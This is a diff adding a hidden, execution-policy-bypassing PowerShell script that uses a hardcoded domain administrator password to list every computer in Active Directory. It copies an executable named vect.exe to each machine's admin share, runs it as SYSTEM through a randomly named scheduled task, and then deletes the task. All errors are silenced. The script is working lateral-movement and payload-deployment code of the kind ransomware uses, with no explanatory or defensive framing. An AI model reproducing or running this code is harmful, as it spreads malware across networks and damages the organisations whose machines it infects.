@@ -1,0 +1,24 @@
+powershell -NoP -NonI -W Hidden -Exec Bypass -C "$ErrorActionPreference='SilentlyContinue'
+$u='LAB\Administrator';$p='P@ssw0rd123!'
+$src='C:\Users\Admin\AppData\Local\Temp\vect.exe'
+$name='vect.exe'
+$sp=ConvertTo-SecureString $p -AsPlainText -Force
+$cred=New-Object PSCredential($u,$sp)
+$pcs=@([adsisearcher]'objectCategory=computer').FindAll()|%{$_.Properties.dnshostname[0]}|?{$_ -and $_ -ne $env:COMPUTERNAME}
+foreach($pc in $pcs){
+  $dest="\\$pc\C`$\ProgramData\$name"
+  $tn='DM'+(-join((65..90)|Get-Random -Count 4|%{[char]$_}))
+  try{
+    Copy-Item $src $dest -Force -EA Stop
+    $action=New-ScheduledTaskAction -Execute "C:\ProgramData\$name"
+    $principal=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+    $task=New-ScheduledTask -Action $action -Principal $principal
+    $sess=New-CimSession -ComputerName $pc -Credential $cred -EA Stop
+    Register-ScheduledTask -CimSession $sess -TaskName $tn -InputObject $task -Force -EA Stop|Out-Null
+    Start-ScheduledTask -CimSession $sess -TaskName $tn -EA Stop
+    Start-Sleep -Milliseconds 500
+    Unregister-ScheduledTask -CimSession $sess -TaskName $tn -Confirm:$false -EA SilentlyContinue
+    Remove-CimSession $sess
+  }catch{}
+}
+"
